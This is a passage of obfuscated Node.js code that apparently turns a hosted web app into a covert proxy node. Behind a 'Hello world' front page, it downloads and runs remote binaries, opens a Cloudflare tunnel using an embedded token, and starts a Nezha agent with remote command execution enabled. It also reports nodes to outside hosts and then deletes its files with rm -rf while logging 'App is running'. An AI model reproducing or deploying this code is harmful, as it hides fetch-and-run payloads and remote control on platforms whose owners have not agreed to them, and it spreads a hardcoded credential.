axios[_0x34bff3(0x1bd)](UPLOAD_URL+'/api/add-nodes',_0x50efc9,{'headers':{'Content-Type':'application/json'}});return _0x8ce74e&&_0x8ce74e[_0x34bff3(_0x9a3228._0x10e052)]===0xc8?(console['log'](_0x34bff3(0x159)),_0x8ce74e):null;}catch(_0x9787c){return null;}}else return;}}function cleanFiles(){const _0x52d617={_0x588aca:0x14e,_0x4f4b55:0x1e3,_0x185a95:0x160},_0x2193a4={_0x7828f7:0x12d};setTimeout(()=>{const _0x36c6db={_0x4a95f0:0x1a3,_0x5007d5:0x140},_0xc6632=_0x1d9c,_0x236151=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x236151['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x236151[_0xc6632(0x1a6)](phpPath);process[_0xc6632(_0x52d617._0x588aca)]===_0xc6632(0x1dd)?exec(_0xc6632(_0x52d617._0x4f4b55)+_0x236151[_0xc6632(0x1a2)]('\x20')+_0xc6632(_0x52d617._0x185a95),_0x2b80cb=>{const _0x3a7de1=_0xc6632;console[_0x3a7de1(0x1a3)](),console[_0x3a7de1(0x140)](_0x3a7de1(0x1d8)),console[_0x3a7de1(0x140)](_0x3a7de1(_0x2193a4._0x7828f7));}):exec('rm\x20-rf\x20'+_0x236151['join']('\x20')+_0xc6632(0x151),_0x1db9b9=>{const _0x2242a8=_0xc6632;console[_0x2242a8(_0x36c6db._0x4a95f0)](),console[_0x2242a8(0x140)]('App\x20is\x20running'),console[_0x2242a8(_0x36c6db._0x5007d5)](_0x2242a8(0x12d));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x1e559c={_0xc1f43d:0x1bd,_0x454239:0x140,_0xf03846:0x16d},_0x347ca1=_0x1e0398;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x347ca1(0x140)](_0x347ca1(0x1b9));return;}try{const _0x1e6a6e=await axios[_0x347ca1(_0x1e559c._0xc1f43d)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x347ca1(0x1e1)}});return console[_0x347ca1(_0x1e559c._0x454239)](_0x347ca1(_0x1e559c._0xf03846)),_0x1e6a6e;}catch(_0x8b1411){return console[_0x347ca1(0x149)](_0x347ca1(0x1c7)+_0x8b1411[_0x347ca1(0x1e4)]),null;}}function _0x50b6(){const _0xb24d27=['http\x20server\x20is\x20running\x20on\x20port:','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','--tls','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','\x20>\x20nul\x202>&1','tunnel.json','country_code','SUB_PATH','arm','fileUrl','tunnel.yml','express','8443','/sub.txt\x20saved\x20successfully','Unhandled\x20error\x20in\x20startserver:','php\x20running\x20error:\x20','\x0a\x20\x20tunnel:\x20','automatic\x20access\x20task\x20added\x20successfully','http','2083','unlinkSync','index.html','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','2087','text/plain;\x20charset=utf-8','\x0a\x0atrojan://','a47ed3cc-811f-4050-83b7-4ec963d7c0b0','utf8','11284890cqaQnC','https://amd64.ssss.nyc.mn/v1','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','CFPORT','2096','\x20successfully','https://arm64.ssss.nyc.mn/bot','npm\x20running\x20error:\x20','.tmp','blackhole','8AcpyWP','6581133obsbuU','substring','Download\x20','2053','\x20-c\x20','http://ip-api.com/json','axios','random','nohup\x20','https://amd64.ssss.nyc.mn/web','false','block','utf-8','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','238600XtjHVk','\x20is\x20running','child_process','base64','env','org','/api/delete-nodes','createWriteStream','/config.json\x20>/dev/null\x202>&1\x20&','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','Hello\x20world!<br><br>You\x20can\x20access\x20/{SUB_PATH}(Default:\x20/sub)\x20to\x20get\x20your\x20nodes!','\x20failed:\x20','send','test','https://arm64.ssss.nyc.mn/web','1065171OQHWBP','vmess','join','clear','/api/add-subscriptions','finish','push','path','direct','Error\x20reading\x20boot.log:','ARGO_DOMAIN','NEZHA\x20variable\x20is\x20empty,skip\x20running','includes','length','443','/vmess-argo?ed=2560','30830dbQokq','sub.txt','response','web\x20running\x20error:\x20','tls','4155342FRmTto','close','forEach','taskkill\x20/f\x20/im\x20','Skipping\x20adding\x20automatic\x20access\x20task','SERVER_PORT','127.0.0.1','catch','post','pkill\x20-f\x20\x22[','stream','.exe\x20>\x20nul\x202>&1','Empowerment\x20success\x20for\x20','trojan','fileName','Error\x20executing\x20command:\x20','saas.sin.fan','none','Add\x20automatic\x20access\x20task\x20faild:\x20','match','Mozilla/5.0','TunnelSecret','Subscription\x20uploaded\x20successfully','mkdirSync','UPLOAD_URL','freedom','split','Unknown','NEZHA_PORT','PROJECT_URL','readFile','then','readFileSync','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','amd','App\x20is\x20running','\x22\x20>\x20/dev/null\x202>&1','sub','firefox','/trojan-argo','win32','4711847VvxjHr','arch','true','application/json','stringify','del\x20/f\x20/q\x20','message','\x20>/dev/null\x202>&1\x20&','AUTO_ACCESS','set','https://api.ip.sb/geoip','Content-Type','util','&fp=firefox&type=ws&host=','list.txt','4nNtxsX','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','NEZHA_SERVER','/vmess-argo','get','https+local://8.8.8.8/dns-query','aarch64','writeFileSync','\x20-p\x20','toString','vless','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','replace','/vless-argo','ArgoDomain:','boot.log','existsSync','xtls-rprx-vision','from','isFile','map','countryCode','pop','\x0a\x0avmess://','floor','pipe','\x20-s\x20','readdirSync','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','log','listen','unlink','\x0a\x20\x20credentials-file:\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','tcp','status','basename','charAt','error','https://amd64.ssss.nyc.mn/agent','eyJhIjoiNmE4NTI0ZTQ3ZmZhMTFmZjY1ZDU4ZmEzODQzYWNiZjgiLCJ0IjoiOWMyOTkxNmYtYmM0My00NTc5LThiMTctMmZlODM3MzU3M2ZiIiwicyI6Ik5UQmlNakV3TmpZdE16STVPQzAwTXpkaUxXRTFNamd0TXpZeU0yVXpPV1JsWmpZNSJ9','\x0avless://','quic','platform','15QwSxtT','chmod','\x20>/dev/null\x202>&1','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','success','NEZHA_KEY','unshift','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','ARGO_PORT','/dev/null','Nodes\x20uploaded\x20successfully','data','Empowerment\x20failed\x20for\x20'];_0x50b6=function(){return _0xb24d27;};return _0x50b6();}async function startserver(){const _0x5dfed1=_0x1e0398;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x369ae5){console[_0x5dfed1(0x149)]('Error\x20in\x20startserver:',_0x369ae5);}}startserver()[_0x1e0398(0x1bc)](_0x554112=>{const _0x21610=_0x1e0398;console[_0x21610(0x149)](_0x21610(0x16a),_0x554112);}),app[_0x1e0398(0x126)]('/',async function(_0x51bec5,_0x5ad13c){const _0x3afbbe={_0x4afc37:0x1a2,_0x4a791d:0x19d},_0x42b51b=_0x1e0398;try{const _0xc2b208=path[_0x42b51b(_0x3afbbe._0x4afc37)](__dirname,_0x42b51b(0x171)),_0x59c38c=await fs['promises'][_0x42b51b(0x1d3)](_0xc2b208,_0x42b51b(0x177));_0x5ad13c[_0x42b51b(0x19d)](_0x59c38c);}catch(_0x2f4fb1){_0x5ad13c[_0x42b51b(_0x3afbbe._0x4a791d)](_0x42b51b(0x19b));}}),app[_0x1e0398(0x141)](PORT,()=>console[_0x1e0398(0x140)](_0x1e0398(0x15c)+PORT+'!'));
